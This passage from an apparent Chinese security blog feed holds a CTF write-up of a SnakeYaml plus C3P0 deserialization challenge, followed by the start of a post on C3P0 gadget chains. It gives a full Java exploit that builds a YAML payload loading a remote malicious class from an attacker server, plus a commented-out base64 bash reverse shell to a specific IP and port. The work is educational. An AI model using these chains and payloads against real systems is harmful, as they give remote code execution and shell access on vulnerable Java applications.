class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> in.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：jndi-注入"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：jndi-注入" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：jndi 注入"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：jndi 注入</h3><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -InitialContext#lookup()<br></code></pre></td></tr></table></figure><p><code>com.mchange.v2.naming.ReferenceIndirector#getObject()</code> 内部可以触发 JNDI 注入：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010609440.png" alt="image-20240805010609440"></p><p>看到lookup基本就有谱了。</p><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：远程类加载"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：远程类加载" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：远程类加载"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：远程类加载</h3><p>利用链可参考ysoserial：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()<br>  -IndirectlySerialized#getObject()<br>  -com.mchange.v2.naming.ReferenceIndirector#getObject()<br>    -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)<br>     -URLClassLoader<br></code></pre></td></tr></table></figure><p>对于最后一步<code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)</code></p><p>这里会获取通过 URLClassLoader 来加载远程的类并进行初始化和 getObjectInstance 方法的调用，</p><p>因此可以直接在静态块里面放入恶意数据进行RCE：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010633303.png" alt="image-20240805010633303"></p><p>对于前面一个jndi也有的PoolBackedDataSourceBase，这里一并讲了。</p><p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010651598.png" alt="image-20240805010651598"></p><p>红框中的 <code>ois.readObject()</code> 获取的是 IndirectlySerialized 对象，IndirectlySerialized 是一个接口，其的唯一子类是 ReferenceSerialized，</p><p>但是 ReferenceSerialized 是 ReferenceIndirector 类内部的私有类，该类不能进行初始化操作。</p><p>所以我们现在要看 writeObject 是如何将 ReferenceSerialized 写入到序列化流中的。</p><p>从序列化角度来看：</p><p><code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#writeObject()</code> 中，</p><p>如果序列化的类是不可序列化的话(NotSerializableException)，将会在 catch 块中对 connectionPoolDataSource 属性用 ReferenceIndirector.indirectForm 方法处理后再进行序列化操作。(connectionPoolDataSource 属性是 ConnectionPoolDataSource 类的实例)</p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805010709621.png" class="" title="image-20240805010709621"><p><code>ReferenceIndirector.indirectForm</code> 方法中会取出参数 ConnectionPoolDataSource 实例中的 Reference 对象并构造出可序列化的 <code>ReferenceSerialized</code> 对象并返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> IndirectlySerialized <span class="hljs-title function_">indirectForm</span><span class="hljs-params">( Object orig )</span> <span class="hljs-keyword">throws</span> Exception<br>&#123; <br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> ((Referenceable) orig).getReference();<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );<br>&#125;<br>ReferenceSerialized( Reference   reference,<br>                    Name        name,<br>                    Name        contextName,<br>                    Hashtable   env )<br>&#123;<br>    <span class="hljs-built_in">this</span>.reference = reference;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.contextName = contextName;<br>    <span class="hljs-built_in">this</span>.env = env;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>所以我们就需要序列化一个没有实现 Serializable 接口的 ConnectionPoolDataSource 的实例才能将 IndirectlySerialized 写入到序列化流中。</strong></p><p>ConnectionPoolDataSource 接口有俩个子类，不过遗憾的是它们俩都可以被序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource<br>JndiRefConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p>那么只能自己写一个实现 ConnectionPoolDataSource 接口的类但是不可被序列化的类，也关系到这个题的exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/evil.jar&quot;</span>);<br>        <span class="hljs-keyword">return</span> reference;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：BeanFactory不出网"><a href="#com-mchange-v2-c3p0-impl-PoolBackedDataSourceBase-readObject：BeanFactory不出网" class="headerlink" title="com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：BeanFactory不出网"></a>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject：BeanFactory不出网</h3><p><a href="https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">JAVA反序列化之C3P0不出网利用</a> 和 JNDI 高版本注入很像。</p><p>关于JNDI高版本注入，这个我在之前的博客就分析了：<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">绕过JDK高版本限制进行JNDI注入 - Eddie_Murphy - 博客园 (cnblogs.com)</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>言归正传，回到怎么打题目本身。</p><p>题目入口是 yaml.load，还给了 C3P0 依赖，又过滤了 jndi 之类的关键字，所以能想到肯定是 <strong>SnakeYaml + C3P0 的 HEX 二次反序列化</strong>。</p><p>根据上面的 5 条 C3P0 利用链，选择 SnakeYaml 反序列化触发原生反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSource#setUserOverridesAsString --&gt; ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>然后再触发远程类加载或者jndi注入:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; InitialContext#lookup<br>or<br>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject --&gt; IndirectlySerialized#getObject() --&gt; com.mchange.v2.naming.ReferenceableUtils#referenceToObject --&gt; URLClassLoader<br></code></pre></td></tr></table></figure><p>借用原作者 URLClassLoader 远程加载类POC直接打了。</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805003817800.png" alt="image-20240805003817800"></p><p>入口很显然在这个yaml.load，这里我使用的方法是C3P0的HEX序列化字节加载器，SnakeYaml就起到一个调用<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</code>的作用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snakeyaml;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://vps:port/&quot;</span>);<br><span class="hljs-comment">//            ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="hljs-comment">//            resourceRef.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#x27;bash -c \&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMjkuMTcwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#x27;)&quot;));</span><br><span class="hljs-comment">//            return resourceRef;</span><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        C3P0 c3P0=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0</span>();<br>        PoolBackedDataSourceBase poolBackedDataSourceBase=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//有参构造方法是public</span><br>        Field connectionPoolDataSource=poolBackedDataSourceBase.getClass().getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        connectionPoolDataSource.setAccessible(<span class="hljs-literal">true</span>);<br>        connectionPoolDataSource.set(poolBackedDataSourceBase,c3P0);<br>        String hex=byteArrayToHexString(serialize(poolBackedDataSourceBase));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml=new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br><span class="hljs-comment">//        byte[] result=serialize(poolBackedDataSourceBase);</span><br><span class="hljs-comment">//        unserialize(result);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream outputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        outputStream.writeObject(object);<br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ByteArrayInputStream byteArrayInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(s);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">byteArrayToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] byteArray)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : byteArray) &#123;<br>            sb.append(String.format(<span class="hljs-string">&quot;%02X&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload记得URL编码：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004855145.png" alt="image-20240805004855145"></p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004832508.png" alt="image-20240805004832508"></p><p>环境变量拿下flag：</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004825368.png" alt="image-20240805004825368"></p><p>参考：</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake - B0T1eR - 博客园 (cnblogs.com)</a></p><p><a href="https://www.aiwin.fun/index.php/archives/1677/#cl-10">CTF-Java题记录 - 首页|Aiwin</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C3P0</title>
    <link href="/2024/08/05/C3P0/"/>
    <url>/2024/08/05/C3P0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C3P0是JDBC的一个连接池组件，类似的连接池组件还有Druid、DBCP</p><blockquote><p>在执行JDBC的CRUD操作时，若每次操作都建立一次新的数据库连接到销毁，开销就太大了。因此通过连接池（Connection Pool）复用创建好的连接。</p><p><strong>C3P0</strong>是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="URLClassLoader-http-base"><a href="#URLClassLoader-http-base" class="headerlink" title="URLClassLoader - http base"></a>URLClassLoader - http base</h3><h4 id="PoolBackedDataSourceBase-writeObject"><a href="#PoolBackedDataSourceBase-writeObject" class="headerlink" title="PoolBackedDataSourceBase#writeObject"></a><code>PoolBackedDataSourceBase#writeObject</code></h4><p>首先尝试序列化当前对象的<code>connectionPoolDataSource</code>属性，若抛出<code>NotSerializableException</code>异常，即不能序列化，则catch这个异常，并用<code>ReferenceIndirector.indirectForm</code>处理后再序列化。</p><p><img src="/2024/08/05/C3P0/image-20240804232020746.png" alt="image-20240804232020746"></p><p><img src="/2024/08/05/C3P0/image-20240804232139501.png" alt="image-20240804232139501"></p><p>以上可见，调用<code>connectionPoolDataSource</code>属性的<code>getReference()</code>，返回后作为参数封装进<code>ReferenceSerialized</code>对象，而<code>ReferenceSerialized</code>实现的接口<code>IndirectlySerialized</code>继承了<code>Serializable</code>接口，因此<code>ReferenceSerialized</code>可被序列化。</p><p><img src="/2024/08/05/C3P0/image-20240804232326973.png" alt="image-20240804232326973"></p><h4 id="PoolBackedDataSourceBase-readObject"><a href="#PoolBackedDataSourceBase-readObject" class="headerlink" title="PoolBackedDataSourceBase#readObject"></a><code>PoolBackedDataSourceBase#readObject</code></h4><p><img src="/2024/08/05/C3P0/image-20240804232650387.png" alt="image-20240804232650387"></p><p>若传进来的序列化对象是上文的<code>ReferenceSerialized</code>，这里调用其<code>getObject</code>方法：</p><p><img src="/2024/08/05/C3P0/image-20240804232803817.png" alt="image-20240804232803817"></p><p>跟进<code>ReferenceableUtils.referenceToObject()</code>：</p><p><img src="/2024/08/05/C3P0/image-20240804233055575.png" alt="image-20240804233055575"></p><p>ref，也就是这里的var0，是之前序列化时候可控的，可以通过URLClassLoader加载并实例化远程类。</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>要让<code>connectionPoolDataSource</code>这个属性是个实现<code>ConnectionPoolDataSource</code>、<code>Referenceable</code>（后面要调用它的<code>getReference()</code>再拿去封装到<code>ReferenceSerialized</code>）这两个接口的类。重写<code>getReference()</code>方法，让其<code>factoryLoaction</code>指向恶意类所在服务器地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>    &#125;<br><span class="hljs-comment">// override</span><br>&#125;<br></code></pre></td></tr></table></figure><p>作为<code>PoolBackedDataSourceBase</code>（这个类本身有实现<code>Serializable</code>接口）的<code>connectionPoolDataSource</code>属性，由于evil类没有实现<code>Serializable</code>接口，无法反序列化。</p><p>在调用<code>writeObject</code>时，调用<code>evil</code>的<code>getReference()</code>方法，返回值封装进可序列化的<code>ReferenceSerialized</code>对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 